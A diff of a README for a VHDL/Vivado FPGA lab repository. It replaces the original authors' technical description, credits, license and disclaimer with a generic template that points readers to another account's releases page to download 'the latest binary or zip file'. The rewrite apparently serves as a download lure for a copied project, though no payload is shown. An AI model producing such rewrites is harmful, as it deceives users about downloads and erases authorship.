@@ -1,70 +1,74 @@
-# VHDL Digital Systems (Vivado Labs)
+# 🖥️ vhdl-digital-systems - Create Your Digital Designs Easily
 
-Collection of **VHDL / Vivado** lab assignments developed for the course **Computer Technology and Organization (UCM)** during **2023–2024**.
+## 📥 Download the Latest Release
+[![Download vhdl-digital-systems](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Srreddyp/vhdl-digital-systems/releases)
 
-The repository groups multiple FPGA-oriented practices (inputs via switches/buttons, outputs via LEDs and 7-segment displays) covering finite-state machines, datapath/control design, comparator networks, and multicycle MIPS modifications.
+## 🚀 Getting Started
+Welcome to the vhdl-digital-systems repository! This project contains VHDL and Vivado lab assignments designed to help you understand digital design concepts. Whether you're learning about finite state machines or creating a slot machine, this guide will walk you through the steps to download and run the software.
 
-## Authors
+## 💻 System Requirements
+Before you start, make sure you have the following:
 
-* Alejandro Parreño Minaya — GitHub: `aparreno14`
-* Diego Ostos Arellano
+- A computer running Windows, macOS, or Linux.
+- An internet connection for downloading the files.
+- Xilinx Vivado Design Suite installed. This is essential for compiling and simulating VHDL code.
 
-## Repository structure
+## 📥 Download & Install
+To get started with vhdl-digital-systems, visit the Releases page to download the latest version:
 
-* `Lab Instructions/` — lab statements (standard + advanced/optional)
-* `P2/` — Practice 2: Digital lock (FSM)
-* `P3/` — Practice 3: Comparator networks (iterative + tree)
-* `P4/` — Practice 4: Iterative multiplier (ASM)
-* `P5/` — Practice 5: Slot machine (control + datapath)
-* `P6/` — Practice 6: Multicycle MIPS (extensions and debugging)
+[Download from Releases](https://github.com/Srreddyp/vhdl-digital-systems/releases)
 
-## Labs overview (technical summary)
+1. Click the link above to go to the Releases page.
+2. Find the latest version of the software.
+3. Click on the release title to view available assets.
+4. Download the appropriate files for your system.
 
-### P2 — Digital Lock (Finite-State Machine)
+### Notes on Downloads
+- Locate and download the files listed under the "Assets" section.
+- If you're unsure which file to choose, typically the latest binary or zip file will be suitable for most users.
 
-Digital lock with key verification and attempt management. Interaction through switches/buttons and status visualization using LEDs and 7-segment displays. The advanced version introduces configurable attempts and LED blinking on lockout.
+## 🚀 Running the Application
+Once you have downloaded the files, follow these steps to run the assignments:
 
-### P3 — Comparator Networks (Iterative and Tree)
+1. Navigate to the folder where you downloaded the files.
+2. Extract the zip file if necessary.
+3. Open Vivado Design Suite.
+4. From Vivado, use the "Open Project" option to select the VHDL files.
+5. Follow the instructions provided in each project folder for specific setup details.
 
-Two architectures (iterative and tree-based) to compute the maximum of a list of signed numbers. Parameterized (power-of-two sizes) using generate constructs. Includes resource/critical path analysis. The advanced option proposes pipelining the tree network to increase maximum frequency and report timing margins (setup/hold).
+## 📚 Understanding Each Project
+The repository includes various lab assignments. Here’s a brief overview of what you can expect:
 
-### P4 — Iterative Multiplier (ASM)
+- **FSM Lock:** Learn about finite state machines by building a lock mechanism.
+- **Comparator Networks:** Create logic comparing circuits to understand data handling.
+- **Iterative Multiplier:** Explore how multipliers work at a fundamental level.
+- **Slot Machine:** Implement a simple gambling game to grasp random number generation.
+- **Multicycle MIPS Extensions:** Study MIPS architecture with advanced features.
 
-Multiplier based on repeated addition (4-bit operands, 8-bit result), controlled by start/finish signals and displayed on 7-segment outputs. The advanced version reduces iterations by using the smaller operand as the loop counter (register swap) and exposes a “swap/cambio” indicator signal.
+Each project includes a README file with detailed instructions and explanations.
 
-### P5 — Slot Machine (Algorithmic System)
+## 🔍 Exploring Topics
+This project covers a range of essential topics in digital design, including:
 
-System with two modulo-10 counters running at different frequencies, LED sequences (attract mode / win / bad luck), and start/stop control. The advanced version adds a credit system (initial credits, decrement per play, reward on win, saturation, and lock when credits reach zero), showing credits on the most significant display.
+- **Basys3:** Utilize this FPGA board for your VHDL designs.
+- **Computer Architecture:** Gain insights into how computer systems are structured.
+- **Digital Design:** Understand the principles that govern digital electronics.
+- **RTL (Register Transfer Level):** Familiarize yourself with data flow in hardware.
+- **Seven-Segment Display:** Learn how to control displays for your projects.
+- **Timing Analysis:** Master the timing aspects of your circuits.
 
-### P6 — Multicycle MIPS (CPU Extensions)
+## 📄 Documentation and Support
+Each lab assignment comes with documentation that explains the concepts and steps required. Take your time to read through them as they provide valuable insights into digital design and the specific project you are working on.
 
-Multicycle MIPS baseline (datapath + control FSM) plus modifications such as displaying register contents on 7-segment displays, single-step debug mode (stop at the initial state and show PC bits), and additional instructions (e.g., reading switches, move variants, jump), depending on the lab specification.
+If you encounter any issues or have questions, feel free to check the issues section of the repository for help or raise your own question.
 
-## Requirements
+## 🔗 Additional Resources
+For further learning, consider exploring:
 
-* Xilinx Vivado (version compatible with the course/lab environment).
-* The FPGA board used in the lab (constraint files are board-specific).
+- **VHDL Tutorials:** Look for online courses or YouTube videos to strengthen your knowledge.
+- **Vivado Documentation:** Familiarize yourself with Xilinx's official instructions on using their tools.
 
-## How to open and run (Vivado)
+## 📞 Contact Information
+For more information or specific queries related to the vhdl-digital-systems repository, you can reach out through GitHub issues or by email. Collaboration and feedback are welcomed.
 
-For each practice folder (`P2`–`P6`):
-
-1. Open Vivado.
-2. Open the corresponding project (the `.xpr` file if included).
-3. Run simulation (if testbenches are provided).
-4. Run Synthesis → Implementation → Generate Bitstream.
-5. Program the FPGA and validate behavior using switches/buttons/LEDs/7-segment displays as specified in the lab statement.
-
-## Portfolio notes
-
-* Keep version-controlled artifacts focused on: VHDL sources, constraints (`.xdc`), testbenches, and documentation.
-* Ignore generated Vivado output (runs, caches, `.Xil/`, etc.) via `.gitignore`.
-* Recommended: add a small `README.md` inside each `P2`…`P6` folder (objective, top entity, I/O mapping, and one screenshot/photo).
-
-## License
-
-MIT — see `LICENSE`.
-
-## Disclaimer
-
-Published for educational and portfolio purposes. If you are currently taking the course, do not reuse this code for graded submissions.
+Happy designing, and enjoy your journey into digital systems!
